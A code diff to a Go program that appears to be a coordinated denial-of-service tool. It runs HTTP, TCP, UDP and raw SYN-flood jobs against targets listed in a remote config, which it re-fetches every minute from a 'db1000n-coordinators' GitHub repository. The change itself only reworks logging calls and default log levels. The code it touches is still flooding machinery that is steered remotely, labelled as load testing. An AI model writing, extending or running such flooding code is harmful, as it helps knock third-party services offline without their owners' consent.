@@ -9,7 +9,6 @@ import (
 	"fmt"
 	"html/template"
 	"io"
-	"log"
 	"math/rand"
 	"net"
 	"net/http"
@@ -89,13 +88,13 @@ func parseStringTemplate(input string) string {
 	// TODO: consider adding ability to populate custom data
 	tmpl, err := template.New("test").Funcs(funcMap).Parse(input)
 	if err != nil {
-		log.Println(err)
+		logs.Default.Warning("error parsing template: %v", err)
 		return input
 	}
 	var output strings.Builder
 	err = tmpl.Execute(&output, nil)
 	if err != nil {
-		log.Println(err)
+		logs.Default.Warning("error executing template: %v", err)
 		return input
 	}
 
@@ -118,7 +117,7 @@ func httpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 	for jobConfig.Next(ctx) {
 		req, err := http.NewRequest(parseStringTemplate(jobConfig.Method), parseStringTemplate(jobConfig.Path), bytes.NewReader(parseByteTemplate(jobConfig.Body)))
 		if err != nil {
-			l.Error("error creating request: %v", err)
+			l.Debug("error creating request: %v", err)
 			continue
 		}
 		for key, value := range jobConfig.Headers {
@@ -130,7 +129,7 @@ func httpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 
 		resp, err := http.DefaultClient.Do(req)
 		if err != nil {
-			l.Error("error sending request %v: %v", req, err)
+			l.Debug("error sending request %v: %v", req, err)
 			continue
 		}
 
@@ -173,7 +172,7 @@ func tcpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 
 		conn, err := net.DialTCP("tcp", nil, tcpAddr)
 		if err != nil {
-			log.Printf("error connecting to [%v]: %v", tcpAddr, err)
+			l.Debug("error connecting to [%v]: %v", tcpAddr, err)
 			continue
 		}
 
@@ -207,7 +206,7 @@ func udpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 	l.Debug("%s started at %d", jobConfig.Address, startedAt)
 	conn, err := net.DialUDP("udp", nil, udpAddr)
 	if err != nil {
-		log.Printf("error connecting to [%v]: %v", udpAddr, err)
+		l.Debug("error connecting to [%v]: %v", udpAddr, err)
 		return err
 	}
 
@@ -244,7 +243,7 @@ func synFloodJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 		<-ctx.Done()
 		shouldStop <- true
 	}()
-	log.Println("sending syn flood with params:", jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
+	l.Debug("sending syn flood with params:", jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
 	return synfloodraw.StartFlooding(shouldStop, jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
 }
 
@@ -286,7 +285,7 @@ func main() {
 	var logLevel logs.Level
 	flag.StringVar(&configPath, "c", "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.json", "path to a config file, can be web endpoint")
 	flag.DurationVar(&refreshTimeout, "r", time.Minute, "refresh timeout for updating the config")
-	flag.IntVar(&logLevel, "l", logs.Error, "logging level. 0 - Debug, 1 - Info, 2 - Warning, 3 - Error. Default is Error")
+	flag.IntVar(&logLevel, "l", logs.Info, "logging level. 0 - Debug, 1 - Info, 2 - Warning, 3 - Error. Default is Info")
 	flag.Parse()
 	l := logs.Logger{Level: logLevel}
 	var cancel context.CancelFunc
@@ -296,7 +295,7 @@ func main() {
 	for {
 		config, err := fetchConfig(configPath)
 		if err != nil {
-			l.Error("fetching json config: %v\n", err)
+			l.Warning("fetching json config: %v\n", err)
 			continue
 		}
 		if cancel != nil {
@@ -313,7 +312,7 @@ func main() {
 					go job(ctx, &l, jobDesc.Args)
 				}
 			} else {
-				l.Error("no such job - %s", jobDesc.Type)
+				l.Warning("no such job - %s", jobDesc.Type)
 			}
 		}
 		time.Sleep(refreshTimeout)
